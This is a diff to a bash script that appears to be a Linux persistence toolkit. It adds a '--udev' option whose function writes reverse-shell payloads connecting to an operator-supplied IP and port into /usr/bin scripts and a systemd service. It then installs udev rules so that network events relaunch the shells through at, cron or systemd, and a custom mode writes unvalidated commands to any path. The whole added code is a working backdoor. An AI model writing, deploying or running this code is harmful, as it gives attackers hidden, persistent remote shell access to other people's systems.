@@ -208,6 +208,16 @@ usage_root() {
     echo "      --custom                     Use custom binary backdoor settings"
     echo "          --binary <binary>           Specify the binary to backdoor"
     echo "          --command <command>         Specify the command to execute"
+    echo "  --udev                      Cron job persistence"
+    echo "      --default                    Use default cron settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "          --at                       Persist through At"
+    echo "          --cron                     Persist through Cron"
+    echo "          --systemd                  Persist through Systemd"
+    echo "      --custom                     Use custom cron settings"
+    echo "          --command <command>         Specify custom persistence command (no validation)"
+    echo "          --path                      Specify custom udev path (no validation)"
 }
 
 setup_systemd() {
@@ -1948,6 +1958,142 @@ setup_system_binary_backdoor() {
     fi
 }
 
+setup_udev() {
+	local default=0
+	local ip=""
+	local port=""
+	local mechanism=""
+	local custom=0
+	local command=""
+	local path=""
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--ip )
+				shift
+				ip="$1"
+				;;
+			--port )
+				shift
+				port="$1"
+				;;
+			--at | --cron | --systemd )
+				mechanism="$1"
+				;;
+			--custom )
+				custom=1
+				;;
+			--command )
+				shift
+				command="$1"
+				;;
+			--path )
+				shift
+				path="$1"
+				;;
+			* )
+				echo "Invalid option: $1"
+				exit 1
+		esac
+		shift
+	done
+
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --default requires --ip and --port."
+			exit 1
+		fi
+		if [[ -z $mechanism ]]; then
+			echo "Error: --default requires --at, --cron, or --systemd."
+			exit 1
+		fi
+
+		case $mechanism in
+			--at )
+				# Check if 'at' utility is available
+				if ! command -v at &> /dev/null; then
+					echo "Error: 'at' utility is not available. Please install it to use --at option."
+					exit 1
+				fi
+
+				# Create the netest script with reverse shell payload
+				cat <<-EOF > /usr/bin/atest
+				#!/bin/sh
+				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
+				EOF
+				chmod +x /usr/bin/atest
+
+				# Create the udev rules file
+				cat <<-EOF > /etc/udev/rules.d/10-atest.rules
+				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
+				EOF
+				;;
+
+			--cron )
+				# Create the netest script with reverse shell payload
+				cat <<-EOF > /usr/bin/crontest
+				#!/bin/sh
+				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
+				EOF
+				chmod +x /usr/bin/crontest
+
+				# Create the udev rules file
+				cat <<-EOF > /etc/udev/rules.d/11-crontest.rules
+				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/bin/bash -c 'echo \"* * * * * /usr/bin/crontest\" | crontab -'"
+				EOF
+				;;
+
+			--systemd )
+				# Create the systemd service unit
+				cat <<-EOF > /etc/systemd/system/systemdtest.service
+
+				[Unit]
+				Description=Systemdtest Service
+
+				[Service]
+				ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
+				Restart=always
+				RestartSec=60
+
+				[Install]
+				WantedBy=default.target
+				EOF
+
+				systemctl daemon-reload
+				systemctl enable systemdtest.service
+				systemctl start systemdtest.service
+
+				# Create the udev rules file
+				cat <<-EOF > /etc/udev/rules.d/12-systemdtest.rules
+				SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemdtest.service"
+				EOF
+				;;
+		esac
+
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $command || -z $path ]]; then
+			echo "Error: --custom requires --command and --path."
+			exit 1
+		fi
+
+		# Create the custom udev rules file
+		echo "$command" > "$path"
+
+	else
+		echo "Error: Either --default or --custom must be specified for --udev."
+		exit 1
+	fi
+
+	# Reload udev rules
+	sudo udevadm control --reload
+
+	echo "[+] Udev persistence established."
+}
+
+
 main() {
 	local QUIET=0
 
@@ -2096,6 +2242,11 @@ main() {
                 setup_system_binary_backdoor "$@"
                 exit
                 ;;
+			--udev )
+            	shift
+            	setup_udev "$@"
+            	exit
+            	;;
 			* )
 				echo "Invalid option: $1"
 				if check_root; then
